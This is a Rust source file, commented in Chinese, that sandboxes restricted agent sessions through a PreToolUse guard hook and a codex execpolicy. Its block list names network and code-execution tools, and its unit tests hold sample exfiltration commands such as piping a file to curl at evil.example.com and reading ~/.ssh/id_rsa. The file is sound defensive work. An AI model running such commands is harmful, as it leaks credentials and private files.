//! 授权者（granted）受限会话的强制闸 —— guard-check hook + guard 文件生成。
//!
//! 威胁：授权者驱动 agent 时可访问 owner 机器上一切数据（config.json 凭证、
//! `.ssh`、主目录）并外泄。claude 侧靠 PreToolUse hook 做最终硬闸（hook 在
//! 全权限旗标与未信任目录下都执行）；codex 侧靠 OS 沙箱（read-only）+ execpolicy
//! forbid 网络/代码执行命令（尽力隔离，局限见 agent.rs codex_command 注释）。
//!
//! 防篡改闭环：guard 文件（settings.json）放在工作区外 `~/.agent-bridge/guard/`，
//! 受限 agent 的 Edit/Write/Bash 都够不着——agent 无法改写 hook 放行自己；
//! execpolicy 在工作区内但受 read-only 沙箱保护（沙箱内不可写）。
//!
//! hook 决策流程：`"$ABB_BIN" guard-check` 由 claude 以子进程执行，stdin 收
//! hook 事件 JSON，stdout 输出决策 JSON（deny 时 claude 拒绝该工具调用并把
//! reason 反馈给模型）。guard-check 读 env AGENT_BRIDGE_SENDER_ROLE，非
//! granted 会话直接 allow（owner 会话不被卡）。

use std::path::{Path, PathBuf};

/// guard 文件目录：~/.agent-bridge/guard/<bot_key>/（工作区外，防受限 agent 篡改）。
fn guard_dir(bot_key: &str) -> PathBuf {
    crate::bridge_dir().join("guard").join(bot_key)
}

/// 受限 claude spawn 时 `--settings` 指向的 settings.json 绝对路径。
pub fn guard_settings_path(bot_key: &str) -> PathBuf {
    guard_dir(bot_key).join("settings.json")
}

/// 幂等生成受限会话的 guard 文件（受限 spawn 前调用；内容静态，直接覆盖重写最稳）：
/// - settings.json：claude PreToolUse hook 指向 `"$ABB_BIN" guard-check`
///   （ABB_BIN 绝对路径烘焙进 command，避免依赖 hook 子进程的 env 展开）
/// - .codex/execpolicy/abb.rules：codex forbid 网络外发/代码执行类命令
///   （read-only 沙箱下 agent 不可篡改）
pub fn ensure_guard_files(bot_key: &str) -> std::io::Result<()> {
    let ws = crate::workspace_dir(bot_key);
    let _ = std::fs::create_dir_all(&ws); // execpolicy 写入需要 workspace 存在（spawn 前已有，双保险）
    ensure_guard_files_at(&guard_dir(bot_key), &ws, &std::env::current_exe()?)
}

/// ensure_guard_files 的内部实现（目录/可执行文件可注入，单测用）。
fn ensure_guard_files_at(guard_dir: &Path, workspace: &Path, exe: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(guard_dir)?;
    let exe_str = exe.to_string_lossy();
    let settings = serde_json::json!({
        "hooks": {
            "PreToolUse": [
                {
                    "matcher": "*",
                    "hooks": [
                        { "type": "command", "command": format!("\"{exe_str}\" guard-check") }
                    ]
                }
            ]
        }
    });
    crate::atomic_write_text(
        &guard_dir.join("settings.json"),
        &serde_json::to_string_pretty(&settings).map_err(std::io::Error::other)?,
    )?;
    // codex execpolicy（Starlark）：forbid 网络外发与代码执行类命令。
    // 注意 pattern 是「命令前缀」匹配；cat/grep 等读文件命令不 forbid
    //（codex 无 Read 工具，读文件靠 Bash；防读靠网络隔离 + 读全盘局限已写文档）。
    let ep_dir = workspace.join(".codex").join("execpolicy");
    std::fs::create_dir_all(&ep_dir)?;
    let rules = r#"// ABB 授权者受限会话：forbid 网络外发与代码执行类命令（尽力隔离第二道防线；
// 主防线是 --sandbox read-only + --approval-policy never）。
prefix_rule(pattern=["curl"], decision="forbidden")
prefix_rule(pattern=["wget"], decision="forbidden")
prefix_rule(pattern=["nc"], decision="forbidden")
prefix_rule(pattern=["ncat"], decision="forbidden")
prefix_rule(pattern=["telnet"], decision="forbidden")
prefix_rule(pattern=["ssh"], decision="forbidden")
prefix_rule(pattern=["scp"], decision="forbidden")
prefix_rule(pattern=["sftp"], decision="forbidden")
prefix_rule(pattern=["rsync"], decision="forbidden")
prefix_rule(pattern=["python"], decision="forbidden")
prefix_rule(pattern=["python3"], decision="forbidden")
prefix_rule(pattern=["perl"], decision="forbidden")
prefix_rule(pattern=["ruby"], decision="forbidden")
prefix_rule(pattern=["node"], decision="forbidden")
prefix_rule(pattern=["php"], decision="forbidden")
prefix_rule(pattern=["base64"], decision="forbidden")
prefix_rule(pattern=["xxd"], decision="forbidden")
prefix_rule(pattern=["openssl"], decision="forbidden")
prefix_rule(pattern=["plutil"], decision="forbidden")
prefix_rule(pattern=["security"], decision="forbidden")
prefix_rule(pattern=["sqlite3"], decision="forbidden")
prefix_rule(pattern=["strings"], decision="forbidden")
"#;
    crate::atomic_write_text(&ep_dir.join("abb.rules"), rules)?;
    Ok(())
}

/// guard-check 子命令入口（main.rs 分发）：读 stdin 的 hook 事件 JSON，输出决策 JSON。
/// 返回进程退出码（0；决策在 stdout，hook 不看退出码）。
pub fn guard_check_main() -> i32 {
    // 前置：非 granted 会话直接放行（owner 会话/手动调用不被卡）。
    // env 由桥 spawn agent 时注入、hook 子进程继承。
    let role = std::env::var("AGENT_BRIDGE_SENDER_ROLE").unwrap_or_default();
    if !role.eq_ignore_ascii_case("granted") {
        println!("{}", decision_json(&Decision::Allow));
        return 0;
    }
    let Some(workspace) = resolve_workspace() else {
        println!(
            "{}",
            decision_json(&Decision::Deny(
                "无法解析工作区（AGENT_BRIDGE_BOT_KEY 缺失）".into()
            ))
        );
        return 0;
    };
    let mut input = String::new();
    if std::io::Read::read_to_string(&mut std::io::stdin(), &mut input).is_err() {
        println!(
            "{}",
            decision_json(&Decision::Deny("无法读取 hook 事件".into()))
        );
        return 0;
    }
    let v: serde_json::Value = match serde_json::from_str(&input) {
        Ok(v) => v,
        Err(e) => {
            println!(
                "{}",
                decision_json(&Decision::Deny(format!("hook 事件解析失败: {e}")))
            );
            return 0;
        }
    };
    let tool = v["tool_name"].as_str().unwrap_or("");
    let input_obj = &v["tool_input"];
    let decision = match tool {
        "Read" | "Edit" | "Write" => check_file_paths(tool, input_obj, &workspace),
        "Glob" | "Grep" => check_patterns(tool, input_obj),
        "Bash" => check_bash(input_obj, &workspace),
        // WebFetch/MCP/AskUserQuestion/未知工具：dontAsk 兜底拒绝，这里再显式 deny
        _ => Decision::Deny(format!("工具 {tool} 不在受限白名单")),
    };
    if let Decision::Deny(r) = &decision {
        // hook 的 stdout 是决策 JSON，日志走 stderr（否则污染决策被 claude 误读）
        eprintln!("[guard-check] 拒绝 {tool}: {r}");
    }
    println!("{}", decision_json(&decision));
    0
}

/// 校验结果。
#[derive(Debug, Clone, PartialEq, Eq)]
enum Decision {
    Allow,
    Deny(String),
}

/// 输出给 claude hook 的决策 JSON。schema 为 hookSpecificOutput 形态
/// （新旧版本兼容性见实测清单；deny 时 reason 会成为模型可见的拒绝原因）。
fn decision_json(d: &Decision) -> String {
    let (decision, reason) = match d {
        Decision::Allow => ("allow", "guard 校验通过"),
        Decision::Deny(r) => ("deny", r.as_str()),
    };
    serde_json::json!({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": decision,
            "permissionDecisionReason": format!("受限模式：授权者会话仅允许操作工作区内文件与 $ABB_BIN 白名单命令（{reason}）")
        }
    })
    .to_string()
}

/// 按 AGENT_BRIDGE_BOT_KEY 解析并规范化工作区根（spawn 前已 create_dir_all，必然存在）。
fn resolve_workspace() -> Option<PathBuf> {
    let bot_key = std::env::var("AGENT_BRIDGE_BOT_KEY").ok()?;
    std::fs::canonicalize(crate::workspace_dir(&bot_key)).ok()
}

/// 路径是否落在工作区内（防 symlink 逃逸：canonicalize 解析符号链接后再判前缀）。
/// 新建文件场景（canonicalize 失败）→ 规范化父目录 + 拼文件名再判。
/// 相对路径按「相对工作区」解析；`..` 由 canonicalize 天然规范化；`~` 无法解析 → 拒绝。
/// 供 deliver CLI 自校验复用（纵深防御第二层）。
pub fn canonical_in_workspace(p: &str, workspace: &Path) -> bool {
    let p = p.trim();
    if p.is_empty() {
        return false;
    }
    let path = PathBuf::from(p);
    let abs = if path.is_absolute() {
        path
    } else {
        workspace.join(path)
    };
    match std::fs::canonicalize(&abs) {
        Ok(c) => c.starts_with(workspace),
        Err(_) => {
            // 目标不存在（新建文件）：父目录必须在工作区内 + 文件名不越界
            let Some(name) = abs.file_name() else {
                return false;
            };
            let Some(parent) = abs.parent() else {
                return false;
            };
            match std::fs::canonicalize(parent) {
                Ok(cp) => cp.join(name).starts_with(workspace),
                Err(_) => false,
            }
        }
    }
}

/// Read/Edit/Write：file_path（字符串或数组）逐个过工作区路径校验。
fn check_file_paths(tool: &str, input: &serde_json::Value, workspace: &Path) -> Decision {
    let mut paths = Vec::new();
    match &input["file_path"] {
        serde_json::Value::String(s) => paths.push(s.as_str()),
        serde_json::Value::Array(arr) => {
            for v in arr {
                match v.as_str() {
                    Some(s) => paths.push(s),
                    None => return Decision::Deny(format!("{tool} 的 file_path 含非字符串元素")),
                }
            }
        }
        _ => return Decision::Deny(format!("{tool} 缺 file_path")),
    }
    for p in paths {
        if !canonical_in_workspace(p, workspace) {
            return Decision::Deny(format!("{tool} 目标在工作区外（已拒绝：{p}）"));
        }
    }
    Decision::Allow
}

/// Glob/Grep：pattern 不得含 `..` 穿越、不得以 `/`（绝对）或 `~` 开头。
fn check_patterns(tool: &str, input: &serde_json::Value) -> Decision {
    let Some(pattern) = input["pattern"].as_str() else {
        return Decision::Deny(format!("{tool} 缺 pattern"));
    };
    if pattern.contains("..") {
        return Decision::Deny(format!("{tool} pattern 含 .. 穿越（已拒绝：{pattern}）"));
    }
    if pattern.starts_with('/') || pattern.starts_with('~') {
        return Decision::Deny(format!("{tool} pattern 指向工作区外（已拒绝：{pattern}）"));
    }
    Decision::Allow
}

/// Bash：shell 分词后按白名单校验（ABB_BIN / 只读 git / 只读命令 + 路径参数校验）。
fn check_bash(input: &serde_json::Value, workspace: &Path) -> Decision {
    let Some(cmd) = input["command"].as_str() else {
        return Decision::Deny("Bash 缺 command".into());
    };
    let Some(argv) = split_shell(cmd) else {
        return Decision::Deny("含复合语法（管道/重定向/命令替换等），受限会话拒绝".into());
    };
    let program = argv[0].as_str();
    let rest = &argv[1..];
    // $ABB_BIN（桥注入的本程序绝对路径）：job/session/deliver 白名单
    let exe = std::env::current_exe().ok();
    let is_abb = exe
        .as_ref()
        .map(|e| program == e.to_string_lossy())
        .unwrap_or(false)
        || program == "$ABB_BIN";
    if is_abb {
        return check_abb_bin(rest, workspace);
    }
    match program {
        // 只读 git：代码仓库操作不越界（workspace 通常不是 git repo，防呆放行只读动词）
        "git" => {
            const READONLY: &[&str] = &[
                "status",
                "diff",
                "log",
                "show",
                "ls-files",
                "branch",
                "remote",
                "rev-parse",
                "check-ignore",
                "blame",
                "describe",
                "help",
                "version",
            ];
            let verb = rest.first().map(|s| s.as_str()).unwrap_or("");
            if READONLY.contains(&verb) {
                Decision::Allow
            } else {
                Decision::Deny(format!("git {verb} 不在只读白名单"))
            }
        }
        // 只读命令：路径类参数必须都落在工作区内
        "ls" | "pwd" | "date" | "echo" | "file" | "stat" | "du" | "wc" | "head" | "tail"
        | "grep" | "cat" | "find" => {
            for arg in rest {
                if is_path_arg(arg) && !canonical_in_workspace(arg, workspace) {
                    return Decision::Deny(format!("命令参数指向工作区外（已拒绝：{arg}）"));
                }
            }
            Decision::Allow
        }
        _ => Decision::Deny(format!("命令 {program} 不在受限白名单")),
    }
}

/// 参数是否可能是路径（绝对/含 / /~ 开头/./ 开头）。纯选项（-n）、纯文件名（a.txt）
/// 不算——工作区内相对路径的 `cat a.txt` 的 a.txt 也会被 join 校验放行。
fn is_path_arg(arg: &str) -> bool {
    arg.starts_with('/') || arg.starts_with('~') || arg.contains('/') || arg.starts_with("..")
}

/// $ABB_BIN 子命令白名单：job*（创建者角色已由 env 追溯）、session reset、
/// deliver（--file 必须工作区内——堵「把任意文件哈希+路径投递到其它会话」外泄通道）。
fn check_abb_bin(rest: &[String], workspace: &Path) -> Decision {
    match rest.first().map(|s| s.as_str()) {
        Some("job") => Decision::Allow,
        Some("session") => {
            if rest.get(1).map(|s| s.as_str()) == Some("reset") {
                Decision::Allow
            } else {
                Decision::Deny("session 仅允许 reset".into())
            }
        }
        Some("deliver") => {
            let mut i = 0;
            while i < rest.len() {
                let a = rest[i].as_str();
                if a == "--file" || a == "-f" {
                    let Some(p) = rest.get(i + 1) else {
                        return Decision::Deny("deliver --file 缺路径".into());
                    };
                    if !canonical_in_workspace(p, workspace) {
                        return Decision::Deny(format!(
                            "deliver --file 指向工作区外（已拒绝：{p}）"
                        ));
                    }
                    i += 2;
                } else {
                    i += 1;
                }
            }
            Decision::Allow
        }
        Some("guard-check") => Decision::Allow, // 无意义但无害
        other => Decision::Deny(format!("$ABB_BIN 子命令不在白名单：{other:?}")),
    }
}

/// 简易 shell 分词：处理单/双引号与反斜杠转义，返回 argv。
/// 复合语法（| > < & ; $() `${` 等）返回 None → 上层整体拒绝（白名单校验
/// 无法安全拆解复合命令，宁可不放行）。简单变量展开（$ABB_BIN 等）允许——
/// 受限会话的 $ABB_BIN 命令是白名单核心，不带引号展开是常见写法。
fn split_shell(s: &str) -> Option<Vec<String>> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut chars = s.chars();
    while let Some(ch) = chars.next() {
        match quote {
            Some(q) => match ch {
                c if c == q => quote = None,
                '\\' if q == '"' => cur.push(chars.next()?),
                c => cur.push(c),
            },
            None => match ch {
                '\'' | '"' => quote = Some(ch),
                '\\' => cur.push(chars.next()?),
                '$' => {
                    // 简单变量（$VAR）允许；命令替换 $() / ${...} / $* 等拒绝
                    match chars.clone().peekable().peek() {
                        Some('(') | Some('{') | Some('*') | Some('#') | Some('@') | Some('?') => {
                            return None;
                        }
                        _ => cur.push('$'),
                    }
                }
                c if c.is_whitespace() => {
                    if !cur.is_empty() {
                        out.push(std::mem::take(&mut cur));
                    }
                }
                '|' | '>' | '<' | '&' | ';' | '(' | ')' | '`' | '!' => return None,
                c => cur.push(c),
            },
        }
    }
    if quote.is_some() {
        return None; // 未闭合引号
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// 建临时 guard 环境（真实目录，canonicalize 可用）：返回 (ws 根, ws, guard)。
    fn temp_guard_env() -> (PathBuf, PathBuf, PathBuf) {
        let root = std::env::temp_dir().join(format!("abb-guard-test-{}", uuid::Uuid::new_v4()));
        let ws = root.join("ws");
        std::fs::create_dir_all(ws.join("sub")).unwrap();
        std::fs::create_dir_all(root.join("outside")).unwrap();
        let guard = root.join("guard");
        (root, ws, guard)
    }

    fn workspace_canon(dir: &Path) -> PathBuf {
        std::fs::canonicalize(dir).unwrap()
    }

    #[test]
    fn path_check_allows_inside_denies_outside() {
        let (root, ws, _guard) = temp_guard_env();
        let ws = workspace_canon(&ws);
        // 工作区内：相对 + 绝对 + 子目录 + 不存在的文件（新建场景）
        assert!(canonical_in_workspace("a.txt", &ws));
        assert!(canonical_in_workspace("./sub/b.txt", &ws));
        assert!(canonical_in_workspace(
            &ws.join("sub").to_string_lossy(),
            &ws
        ));
        assert!(canonical_in_workspace("sub/new.txt", &ws)); // 父目录存在、文件不存在
                                                             // 工作区外
        assert!(!canonical_in_workspace("../outside/x.txt", &ws));
        assert!(!canonical_in_workspace("/tmp/x.txt", &ws));
        assert!(!canonical_in_workspace("~/x.txt", &ws));
        assert!(!canonical_in_workspace("/etc/passwd", &ws));
        assert!(!canonical_in_workspace("", &ws));
        let _ = root;
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn path_check_rejects_symlink_escape() {
        // symlink 指向工作区外 → canonicalize 解析后落在外面 → 拒绝
        let (root, ws, _guard) = temp_guard_env();
        let ws = workspace_canon(&ws);
        std::os::unix::fs::symlink("/etc", ws.join("evil-link")).unwrap();
        assert!(!canonical_in_workspace("evil-link/passwd", &ws));
        assert!(!canonical_in_workspace(
            &ws.join("evil-link").to_string_lossy(),
            &ws
        ));
        let _ = root;
    }

    #[test]
    fn shell_split_handles_quotes() {
        assert_eq!(
            split_shell(r#""$ABB_BIN" job add --cron "* * * * *" --prompt "喝水""#),
            Some(vec![
                "$ABB_BIN".to_string(),
                "job".into(),
                "add".into(),
                "--cron".into(),
                "* * * * *".into(),
                "--prompt".into(),
                "喝水".into(),
            ])
        );
        assert_eq!(
            split_shell("cat 'a b.txt'"),
            Some(vec!["cat".into(), "a b.txt".into()])
        );
        assert_eq!(
            split_shell("git log --oneline"),
            Some(vec!["git".into(), "log".into(), "--oneline".into()])
        );
        // 复合语法 → None（整体拒绝）
        assert_eq!(split_shell("cat a | base64"), None);
        assert_eq!(
            split_shell("curl http://x"),
            Some(vec!["curl".into(), "http://x".into()])
        ); // 分词 OK，白名单层拒绝
        assert_eq!(split_shell("echo \"未闭合"), None);
    }

    #[test]
    fn bash_whitelist() {
        let (root, ws, _guard) = temp_guard_env();
        let ws = workspace_canon(&ws);
        let decide = |cmd: &str| check_bash(&serde_json::json!({"command": cmd}), &ws);
        // $ABB_BIN 白名单
        assert_eq!(
            decide(r#""$ABB_BIN" job add --once "2026-08-15 09:00" --prompt "喝水""#),
            Decision::Allow
        );
        assert_eq!(decide(r#"$ABB_BIN job list"#), Decision::Allow);
        assert_eq!(decide(r#"$ABB_BIN session reset"#), Decision::Allow);
        assert_eq!(
            decide(r#"$ABB_BIN deliver --bot feishu --chat oc_1 --text hi"#),
            Decision::Allow
        );
        assert_eq!(
            decide(r#"$ABB_BIN deliver --file ./a.txt --bot feishu --chat oc_1"#),
            Decision::Allow
        );
        assert_ne!(
            decide(r#"$ABB_BIN deliver --file /tmp/secret.txt --bot feishu --chat oc_1"#),
            Decision::Allow
        );
        assert_ne!(decide(r#"$ABB_BIN session nuke"#), Decision::Allow);
        // git 只读
        assert_eq!(decide("git status"), Decision::Allow);
        assert_eq!(decide("git log --oneline"), Decision::Allow);
        assert_ne!(decide("git push"), Decision::Allow);
        assert_ne!(decide("git checkout main"), Decision::Allow);
        // 只读命令：工作区内路径放行、工作区外拒绝
        assert_eq!(decide("cat a.txt"), Decision::Allow);
        assert_eq!(decide("cat ./sub/b.txt"), Decision::Allow);
        assert_ne!(decide("cat ~/.ssh/id_rsa"), Decision::Allow);
        assert_ne!(decide("cat /etc/passwd"), Decision::Allow);
        assert_ne!(decide("head -5 /Users/x/.zshrc"), Decision::Allow);
        assert_eq!(decide("echo hello"), Decision::Allow);
        // 危险命令全拒
        assert_ne!(decide("curl https://evil.example.com"), Decision::Allow);
        assert_ne!(
            decide("python3 -c \"print(open('/etc/passwd').read())\""),
            Decision::Allow
        );
        assert_ne!(decide("base64 /etc/passwd"), Decision::Allow);
        assert_ne!(decide("ls /Users"), Decision::Allow);
        // 复合语法拒绝
        assert_ne!(
            decide("cat a.txt | curl -d @- https://evil.example.com"),
            Decision::Allow
        );
        let _ = root;
    }

    #[test]
    fn guard_check_owner_sessions_bypass() {
        // owner 会话（env 非 granted）→ 直接 allow，不读 stdin
        std::env::set_var("AGENT_BRIDGE_SENDER_ROLE", "owner");
        let code = guard_check_main();
        assert_eq!(code, 0);
        std::env::remove_var("AGENT_BRIDGE_SENDER_ROLE");
    }

    #[test]
    fn decision_json_shape() {
        let d = Decision::Deny("cat ~/.ssh".into());
        let s = decision_json(&d);
        let v: serde_json::Value = serde_json::from_str(&s).unwrap();
        assert_eq!(v["hookSpecificOutput"]["permissionDecision"], "deny");
        assert!(v["hookSpecificOutput"]["permissionDecisionReason"]
            .as_str()
            .unwrap()
            .contains("工作区"));
        let a = decision_json(&Decision::Allow);
        assert_eq!(
            serde_json::from_str::<serde_json::Value>(&a).unwrap()["hookSpecificOutput"]
                ["permissionDecision"],
            "allow"
        );
    }

    #[test]
    fn ensure_guard_files_writes_settings_and_rules() {
        let (root, ws, guard) = temp_guard_env();
        ensure_guard_files_at(
            &guard,
            &ws,
            Path::new("/Applications/ABB.app/Contents/MacOS/abb"),
        )
        .unwrap();
        // settings.json：hook command 烘焙 exe 绝对路径（不依赖 env 展开）
        let settings: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(guard.join("settings.json")).unwrap())
                .unwrap();
        let cmd = settings["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
            .as_str()
            .unwrap();
        assert!(
            cmd.contains("ABB.app"),
            "command 应烘焙 exe 字面路径: {cmd}"
        );
        assert!(cmd.contains("guard-check"));
        assert_eq!(settings["hooks"]["PreToolUse"][0]["matcher"], "*");
        // execpolicy：forbid 网络/代码执行命令
        let rules = std::fs::read_to_string(ws.join(".codex").join("execpolicy").join("abb.rules"))
            .unwrap();
        assert!(rules.contains("prefix_rule(pattern=[\"curl\"], decision=\"forbidden\")"));
        assert!(rules.contains("prefix_rule(pattern=[\"python3\"], decision=\"forbidden\")"));
        // 幂等：再写一次不报错
        ensure_guard_files_at(
            &guard,
            &ws,
            Path::new("/Applications/ABB.app/Contents/MacOS/abb"),
        )
        .unwrap();
        let _ = root;
    }
}
